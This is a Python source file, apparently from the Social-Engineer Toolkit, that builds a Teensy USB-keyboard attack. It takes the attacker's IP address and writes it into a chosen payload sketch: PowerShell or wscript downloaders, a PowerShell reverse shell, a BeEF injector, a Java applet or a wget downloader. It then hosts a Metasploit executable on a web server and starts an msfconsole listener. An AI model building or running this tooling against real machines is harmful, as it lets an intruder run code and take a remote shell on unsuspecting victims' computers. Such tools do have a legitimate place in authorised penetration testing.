#!/usr/bin/env python
############################
#
# Teensy HID Attack Vector
#
############################
import sys
import pexpect
import re
import os
import subprocess

from src.core.core import *

msf_path=meta_path()

definepath=os.getcwd()
# define if use apache or not
apache=0
# open set_config here
apache_check=file("%s/config/set_config" % (definepath),"r").readlines()
# loop this guy to search for the APACHE_SERVER config variable
for line in apache_check:
        # strip \r\n
        line=line.rstrip()
        # if apache is turned on get things ready
        match=re.search("APACHE_SERVER=ON",line)
        # if its on lets get apache ready
        if match:
                for line2 in apache_check:
                        # set the apache path here
                        match2=re.search("APACHE_DIRECTORY=", line2)
                        if match2:
                                line2=line2.rstrip()
                                apache_path=line2.replace("APACHE_DIRECTORY=","")
                                apache=1

# Open the IPADDR file
if os.path.isfile("src/program_junk/ipaddr.file"):
	fileopen=file("src/program_junk/ipaddr.file","r")
	for line in fileopen:
		line=line.rstrip()
		ipaddr=line

if not os.path.isfile("src/program_junk/ipaddr.file"):
	ipaddr=raw_input("Enter your IP address to connect back on: ")

# Define colors
class bcolors:
    PURPLE = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'

    def disable(self):
        self.PURPLE = ''
        self.BLUE = ''
        self.GREEN = ''
        self.YELLOW = ''
        self.RED = ''
        self.ENDC = ''


if not os.path.isfile("src/program_junk/teensy"):
	print "\nSomething went wrong, the Teensy config file was not created."
	print "Exiting SET....\n\n"
	sys.exit()

# grab info from config file
fileopen=file("src/program_junk/teensy", "r")
counter=0
payload_counter=0
for line in fileopen:
	line=line.rstrip()
	if counter == 0:
		choice=str(line)
	if counter == 1:
		payload_counter=1
	counter=counter+1

#if choice == "1": payload=payload1
#if choice == "2": payload=payload2
#if choice == "3": payload=payload3

def writefile(filename):
	fileopen=file("src/teensy/%s" % filename, "r")
	filewrite=file("reports/teensy.pde", "w")
	for line in fileopen:
		match=re.search("IPADDR",line)
		if match: 
			line=line.replace("IPADDR", ipaddr)
		filewrite.write(line)
	filewrite.close()

# powershell downloader
if choice == "1":
	writefile("powershell_down.pde")

# wscript downloader
if choice == "2":
	writefile("wscript.pde")

# powershell reverse
if choice == "3":
	writefile("powershell_reverse.pde")

# beef injector
if choice == "4":
	writefile("beef.pde")

# java applet downloader
if choice == "5":
	writefile("java_applet.pde")

# gnome wget downloader
if choice == "6":
	writefile("gnome_wget.pde")

# save our stuff here
#filewrite=file("reports/teensy.pde", "w")
#filewrite.write(payload)
#filewrite.close()
print bcolors.BLUE + "\n[*] PDE file created. You can get it under 'reports/teensy.pde' "+bcolors.ENDC
print bcolors.GREEN + '[*] Be sure to select "Tools", "Board", and "Teensy 2.0 (USB/KEYBOARD)" in Arduino' + bcolors.ENDC
print bcolors.RED + "\n[*] If your running into issues with VMWare Fusion and the start menu, uncheck\nthe 'Enable Key Mapping' under preferences in VMWare" + bcolors.ENDC

if payload_counter == 1:
	if apache == 0:
		subprocess.Popen("mkdir src/webattack/web_clone/site/template;cp src/html/msf.exe src/webattack/web_clone/site/template/x.exe 1> /dev/null 2> /dev/null", shell=True).wait()
		child=pexpect.spawn("python src/html/web_server.py")
		
	if apache == 1:
		subprocess.Popen("cp src/html/msf.exe %s/x.exe" % (apache_path), shell=True).wait()
	if os.path.isfile("src/program_junk/meta_config"):
		print bcolors.BLUE + "\n[*] Launching MSF Listener..."
		print bcolors.BLUE + "[*] This may take a few to load MSF..." + bcolors.ENDC
		try:
			child1=pexpect.spawn("ruby %s/msfconsole -L -n -r src/program_junk/meta_config" % (msf_path))
			child1.interact()
		except:
			if apache == 0:
				child.close()
			child1.close()
